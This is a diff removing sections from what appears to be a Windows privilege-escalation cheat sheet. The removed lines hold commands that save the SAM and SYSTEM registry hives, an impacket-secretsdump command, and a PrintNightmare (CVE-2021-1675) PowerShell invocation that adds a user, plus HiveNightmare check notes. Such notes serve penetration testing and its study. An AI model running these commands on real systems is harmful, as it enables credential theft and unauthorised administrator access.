@@ -59,22 +59,6 @@ Pop the shell:
 ```
 
 
-###### Hashdump
-```
-Dumping SAM hashes from CMD:
-https://miloserdov.org/?p=4129
-
-reg save hklm\sam c:\sam
-reg save hklm\system c:\system
-
-Location:
-C:/Windows/System32/config/SAM
-C:/Windows/System32/config/SYSTEM
-
-Dumping hashes from attack machine:
-impacket-secretsdump domain.local/username@10.10.10.10 -just-dc
-```
-
 ###### Token Kidnapping on Windows Server 2003 / 2008 with Churrasco
 
 ```
@@ -155,22 +139,6 @@ $ netstat -ntlp
 > tasklist /SVC
 ```
 
-###### PrintNightmare
-```
-https://github.com/calebstewart/CVE-2021-1675/
-
-Run with (in powershell):
-> powershell -exec bypass -command "& { Import-Module .\CVE-2021-1675.ps1; Invoke-Nightmare; }"
-> Invoke-Nightmare -NewUser "username" -NewPassword "password" -DriverName "PrintMe"
-```
-
-###### HiveNightmare
-```
-https://github.com/GossiTheDog/HiveNightmare
-
-Works on all supported versions of Windows 10, where System Protection is enabled (should be enabled by default in most configurations).
-Check for vuln by checking if the patch for CVE-2021–36934 is installed, and by checking if system protection is enabled (with rstrui.exe ?)
-```
 
 ###### Windows (Kernel) Exploits
 ```
